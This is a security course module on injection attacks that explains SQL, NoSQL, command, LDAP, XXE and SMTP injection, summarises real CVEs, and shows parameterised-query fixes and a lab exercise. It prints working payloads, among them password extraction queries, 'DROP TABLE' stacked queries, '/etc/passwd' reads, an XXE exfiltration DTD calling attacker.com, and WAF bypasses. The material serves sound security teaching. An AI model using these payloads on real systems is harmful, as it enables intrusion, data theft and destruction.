# Module 2: Injection Attacks

Injection vulnerabilities occur when an application takes user-controlled input and incorporates it into a command, query, or interpretation without proper sanitization. The application does not distinguish between data and instructions, and the attacker exploits this by crafting input that alters the intended command structure. Injection is not a single vulnerability class: it spans SQL, NoSQL, OS command, LDAP, XML, SMTP, and any other context where user input is interpreted as code. The underlying principle is always the same: the application trusts user input where it should not.

## SQL Injection: The Mechanics

SQL injection happens when user input is concatenated directly into a SQL query. Consider a login form that builds its query like this:

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

If the username is `admin' --`, the resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

The `--` comments out the rest of the query. The password check is eliminated. The attacker logs in as admin without knowing the password.

This is the textbook example, but real exploitation is rarely this clean. Modern applications use ORMs, parameterized queries, and input validation that block the simple payloads. The real skill is finding the injection points that survive these defenses and crafting payloads that work within the specific database, table structure, and application logic.

### Union-Based SQL Injection

Union-based injection uses the UNION SQL operator to combine the results of the original query with results from the attacker constructs. The attacker first determines the number of columns in the original query by injecting ORDER BY clauses:

```
' ORDER BY 1--  (works)
' ORDER BY 2--  (works)
' ORDER BY 3--  (error - 2 columns)
```

Once the column count is known, the attacker injects a UNION SELECT:

```
' UNION SELECT username, password FROM users-- 
```

This appends the results of the second query to the first. The application displays the combined results, including the attacker's injected data. For this to work, the injected query must return the same number of columns with compatible data types.

In a real application, the injection might be in a search parameter:

```
https://app.example.com/products?search=phone' UNION SELECT 1,table_name FROM information_schema.tables--
```

The attacker uses the information_schema database (present in MySQL, PostgreSQL, and SQL Server with slight syntax differences) to enumerate the database structure: first the tables, then the columns in each table, then the data.

The information_schema attack sequence is systematic:

1. Determine column count: `' ORDER BY 1--`, `' ORDER BY 2--`, etc.
2. Find which columns are displayed: `' UNION SELECT 1,2--`: if "2" appears in the page, column 2 is output.
3. Extract table names: `' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()--`
4. Extract column names: `' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--`
5. Extract data: `' UNION SELECT 1,username FROM users--` and `' UNION SELECT 1,password FROM users--`

### Blind SQL Injection

When the application does not display query results directly, union-based injection does not work. Blind SQL injection infers information from the application's behavior: typically whether the page loads successfully or returns an error.

Boolean-based blind injection uses conditions that evaluate to true or false:

```
' AND 1=1--  (page loads normally)
' AND 1=2--  (page shows error or different content)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--  (normal)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'--  (error)
```

By testing each character position against every possible value, the attacker can extract data one character at a time. This is slow but reliable.

A realistic blind SQL injection extracts the admin password hash character by character. For a 60-character bcrypt hash, this requires approximately 60 × 62 = 3,720 requests (assuming alphanumeric characters). Automated tools like sqlmap handle this automatically, but understanding the mechanics helps you write custom payloads when the automated tools fail.

Time-based blind injection uses SQL functions that introduce delays:

```
' AND IF(1=1, SLEEP(5), 0)--  (5 second delay)
' AND IF(1=2, SLEEP(5), 0)--  (no delay)
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--
```

The attacker measures the response time. A delay indicates the condition was true. This works even when the application returns identical responses regardless of the query result.

The SLEEP function is MySQL-specific. In PostgreSQL, the equivalent is `pg_sleep(5)`. In SQL Server, `WAITFOR DELAY '0:0:5'`. In SQLite, there is no built-in sleep function, but the attacker can use CPU-intensive operations as a timing side channel.

### Error-Based SQL Injection

Some applications display database errors directly. Error-based injection extracts data through error messages:

```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

This forces a duplicate key error that includes the extracted data in the error message. MySQL, PostgreSQL, and SQL Server each have different error-based extraction techniques.

### Advanced SQL Injection Techniques

**Stacked queries**: Some databases allow executing multiple statements separated by semicolons. This enables attacks like `' ; DROP TABLE users-- ` or `' ; INSERT INTO admin_users VALUES('hacker','password123')-- `. MySQL by default does not support stacked queries in PHP, but PostgreSQL and SQL Server do.

**Out-of-band exfiltration**: When you cannot see results and timing is unreliable, some databases support DNS or HTTP requests from the SQL engine. In Oracle, `UTL_HTTP.REQUEST` can make HTTP requests. In SQL Server, `xp_dirtree` can trigger SMB connections that leak data through DNS. This is useful in blind injection scenarios where other techniques fail.

**Second-order SQL injection**: The input is stored safely (not immediately vulnerable) but later used in a query without parameterization. For example, a user registers with a username containing `admin'--`. The registration query is parameterized and safe. But when an admin later resets the user's password, the application builds a query using the stored username without parameterization:

```sql
UPDATE users SET password = 'newpass' WHERE username = 'admin'--'
```

The password of the admin account is overwritten. The vulnerability is not in the registration endpoint but in the password reset endpoint that uses the stored value.

**WAF bypass**: Web Application Firewalls filter known SQL injection patterns. Bypass techniques include:

- Case variation: `SeLeCt` instead of `SELECT`
- Inline comments: `SEL/**/ECT` 
- Encoding: URL encoding, double URL encoding, Unicode encoding
- Alternative syntax: `UNION ALL SELECT` vs `UNION SELECT`
- String concatenation: `CONCAT('a','b')` or `||` operator
- Hex encoding: `0x61646D696E` for `admin`

A real WAF bypass for a MySQL injection on a ModSecurity-filtered application might look like:

```
'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

The `/*!50000...*/` syntax is MySQL-specific conditional execution that ModSecurity sometimes fails to parse. Other bypass techniques include using SQL alternative syntax like `INSERT INTO` instead of `SELECT` for data extraction, using `EXTRACTVALUE` or `UPDATEXML` for error-based extraction, and using `GROUP BY WITH ROLLUP` for authentication bypass.

## NoSQL Injection

MongoDB and other NoSQL databases use different query languages but are equally vulnerable to injection when user input is incorporated into queries unsafely.

In MongoDB, a query like:

```javascript
db.users.find({username: req.body.username, password: req.body.password})
```

becomes vulnerable when the attacker sends a JSON body with operators instead of strings:

```json
{"username": "admin", "password": {"$ne": ""}}
```

This queries for a user named admin whose password is not equal to an empty string, which matches any admin user regardless of password. The `$ne` operator means "not equal." Other dangerous operators include `$gt` (greater than), `$regex` (pattern matching), and `$exists`.

A more sophisticated attack uses `$regex` to extract data character by character:

```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

If the page loads normally, the admin username starts with "a". Increment through the alphabet to extract the full username. This is the NoSQL equivalent of blind SQL injection.

In Node.js applications using Mongoose or the native MongoDB driver, the vulnerability occurs when `req.body`, `req.query`, or `req.params` are passed directly to database queries without type checking. The fix is to validate that input fields are strings before passing them to the database:

```javascript
if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
    return res.status(400).json({error: 'Invalid input'});
}
```

NoSQL injection also affects CouchDB, Cassandra, and other NoSQL databases. In CouchDB, the `_find` API accepts Mango queries that can be manipulated with `$ne` and `$gt` operators. In Elasticsearch, query DSL can be injected through search parameters.

## Command Injection

Command injection occurs when user input is passed to an operating system command. In PHP:

```php
$output = shell_exec("ping " . $_GET['host']);
```

If the host parameter is `8.8.8.8; cat /etc/passwd`, the server executes:

```bash
ping 8.8.8.8; cat /etc/passwd
```

The semicolon separates commands, so both execute. The attacker retrieves the contents of /etc/passwd.

Command injection payloads use several metacharacters depending on the shell and context:

- **Semicolon** (`;`): Executes commands sequentially. Works in bash, sh, cmd.exe.
- **Pipe** (`|`): Pipes the output of one command to another. `ls | cat` lists files and pipes to cat.
- **Ampersand** (`&`): Executes the first command in the background, then the second. In cmd.exe, `&` runs commands sequentially.
- **Backtick** (`` ` ``): Command substitution. `` `whoami` `` executes whoami and substitutes the output.
- **Dollar-parentheses** (`$(...)`): Same as backtick but nestable. `$(whoami)` executes whoami.
- **Double pipe** (`||`): Executes the second command only if the first fails.
- **Double ampersand** (`&&`): Executes the second command only if the first succeeds.
- **Newline** (`%0a`): In URL-encoded contexts, a newline separates commands.

A realistic command injection scenario involves a network diagnostic tool in a web application:

```
https://app.example.com/tools/ping?host=127.0.0.1; whoami
```

The application runs `ping -c 4 127.0.0.1; whoami` and returns both outputs. If the application runs with elevated privileges, the attacker gains command execution as that user.

In Python, command injection through `os.system()` or `subprocess.Popen()` with `shell=True` is equally dangerous:

```python
import os
os.system("grep " + search_term + " /var/log/app.log")
```

The fix is to use `subprocess.Popen()` with a list of arguments and `shell=False`, or to sanitize the input against a whitelist of allowed characters.

In Java, `Runtime.getRuntime().exec()` with a string array is safe because it does not invoke a shell. But when a single string is passed, Java splits on whitespace and executes the first token as the command with remaining tokens as arguments. An attacker can inject additional commands by including shell metacharacters if the command is passed through a shell (e.g., via `/bin/sh -c`).

Command injection in different contexts:

- **Windows cmd.exe**: `&`, `&&`, `||`, `|`, `^` (escape character), `%0a` (newline)
- **Linux bash**: `;`, `&`, `&&`, `||`, `|`, `` ` ` ``, `$()`, `%0a`
- **PHP system functions**: `shell_exec()`, `exec()`, `passthru()`, `popen()`, `proc_open()`, backtick operator
- **Python**: `os.system()`, `os.popen()`, `subprocess.Popen(shell=True)`, `eval()`, `exec()`

## LDAP Injection

LDAP (Lightweight Directory Access Protocol) is used for authentication and directory services. When user input is incorporated into LDAP queries unsafely, injection is possible.

A typical LDAP query:

```
(&(uid=user)(password=pass))
```

If the username is `admin)(|(uid=*`, the query becomes:

```
(&(uid=admin)(|(uid=*)(password=pass))
```

The `(|(uid=*)` opens a group that matches any user. The parentheses balance is off, and the query returns all users. The attacker bypasses authentication.

In Java:

```java
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
```

The fix is to use parameterized LDAP queries with the JNDI `SearchControls` and `DirContext.search()` methods, or to escape special LDAP characters: `*`, `(`, `)`, `\`, and NUL.

LDAP injection can also extract data. If the application displays user information from the directory, an attacker can inject LDAP filter syntax to extract other users' data or bypass authentication.

## XML Injection and XXE

XML External Entity (XXE) injection exploits parsers that process external entities in XML documents. If a web application accepts XML input and the parser has external entity processing enabled:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

The parser replaces `&xxe;` with the contents of /etc/passwd. The attacker reads local files from the server.

XXE can also be used for SSRF (Server-Side Request Forgery) by referencing internal URLs:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

In cloud environments, this reads the instance metadata, which can contain IAM credentials.

XXE blind exfiltration uses out-of-band techniques:

```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

The external DTD file on the attacker's server contains:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param;
```

The data is exfiltrated through the external DTD reference. Modern XML parsers disable external entities by default, but legacy applications and misconfigured parsers remain vulnerable.

XXE can also cause denial of service through the "Billion Laughs" attack (also called XML bomb):

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

This expands to billions of "lol" strings, consuming all available memory.

## SMTP Injection

SMTP injection targets email functionality. If an application constructs email headers from user input:

```python
to_email = request.form['to']
subject = request.form['subject']
message = request.form['message']
send_email(to_email, subject, message)
```

An attacker can inject additional email headers:

```
to_email = "victim@example.com\r\nBcc: attacker@evil.com"
```

The `\r\n` characters inject a BCC header, sending a copy of every email to the attacker. This can also be used to redirect email to different recipients, modify the From header for spoofing, or inject arbitrary SMTP commands.

SMTP injection is particularly dangerous in contact forms, password reset functions, and notification systems. An attacker can use the application's email server to send phishing emails, spam, or malicious content, making the emails appear to come from a trusted source.

## Real CVE Examples

**CVE-2023-38831 (RARLabs WinRAR)**: Path traversal and command injection through crafted archive files. Attackers created ZIP archives with a deceptive file (e.g., document.pdf) and a malicious payload in a companion directory with the same name. When extracted, the malicious script executed instead of the document.

**CVE-2023-44487 (HTTP/2 Rapid Reset)**: While not a traditional injection, this vulnerability exploited the HTTP/2 protocol to perform denial of service by rapidly opening and closing streams. It demonstrated how protocol-level manipulation can have application-level impact.

**CVE-2024-21887 (Ivanti Connect Secure)**: An unauthenticated SQL injection in the management interface allowed attackers to execute arbitrary commands on the appliance. The vulnerability chain started with SQL injection to extract session tokens, followed by command injection to achieve remote code execution.

**CVE-2023-46747 (F5 BIG-IP)**: An unauthenticated remote code execution vulnerability in the BIG-IP Configuration utility exploited a hardcoded credential combined with a path traversal that led to deserialization of untrusted data. The initial access was through an unauthenticated endpoint.

**CVE-2022-1388 (F5 BIG-IP)**: An authorization bypass in the iControl REST interface combined with command injection. The attacker used a crafted connection header with specific F5 authentication tokens to bypass authentication, then injected commands through the tmsh parameter.

**CVE-2019-11510 (Pulse Secure VPN)**: An unauthenticated path traversal that allowed reading arbitrary files, including the session database. Attackers extracted session tokens for all active VPN sessions and impersonated users without credentials. This was exploited in the wild by nation-state actors.

## Prevention: Parameterized Queries and ORM

The primary defense against SQL injection is parameterized queries (also called prepared statements). Instead of concatenating user input into the query string, the database driver handles the escaping:

```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

The database driver ensures that `username` and `password` are treated as data, not as SQL syntax. Even if the user input contains SQL metacharacters, they are interpreted literally.

ORMs (Object-Relational Mappers) like SQLAlchemy, Entity Framework, Sequelize, and Prisma use parameterized queries internally. When you write:

```python
user = User.query.filter_by(username=username, password=password).first()
```

The ORM generates parameterized queries. However, raw SQL queries within ORM contexts bypass this protection:

```python
# DANGEROUS - raw SQL without parameterization
user = db.session.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

For NoSQL databases, the defense is type validation. Ensure that input fields are the expected type before passing them to database queries. Never pass raw request objects to database query methods.

For command injection, the defense is to never pass user input to shell commands. Use language-specific APIs that accept argument lists without invoking a shell:

```python
# DANGEROUS
os.system(f"ping {host}")

# SAFE
subprocess.run(["ping", "-c", "4", host], capture_output=True)
```

Input validation is a secondary defense. Whitelist valid input patterns: if the host parameter should be an IP address, validate that it matches an IP address regex before using it. This prevents injection payloads from ever reaching the command construction.

For XXE, disable external entity processing in XML parsers:

```python
# Python defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(input_file)  # External entities disabled by default

# Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

For LDAP, use parameterized queries or escape special characters. Never concatenate user input directly into LDAP filter strings.

## Practical Exercise: SQL Injection Lab

Using a purpose-built vulnerable application (such as DVWA, Juice Shop, or a custom lab):

1. **Identify injection points**: Test every parameter in every request with a single quote (`'`), double quote (`"`), and SQL keywords. Monitor for error messages that reveal database type and query structure.

2. **Determine column count**: Use ORDER BY with incrementing numbers to find the column count of the vulnerable query.

3. **Extract data**: Use UNION SELECT to extract data from system tables (information_schema.tables, information_schema.columns) to map the database structure.

4. **Blind extraction**: If union-based extraction fails, implement a time-based blind injection script. Write a Python script that measures response times and extracts data character by character.

5. **Bypass filters**: If the application filters certain keywords, attempt bypass using case variation, encoding, comments, or alternative syntax.

6. **Document findings**: For each injection point, document the vulnerable parameter, the database type, the extraction method used, and the data that was accessible.

Time limit: 60 minutes. Grading criteria: successful identification of injection points (20%), data extraction via union-based injection (30%), successful blind extraction (30%), documentation quality (20%).
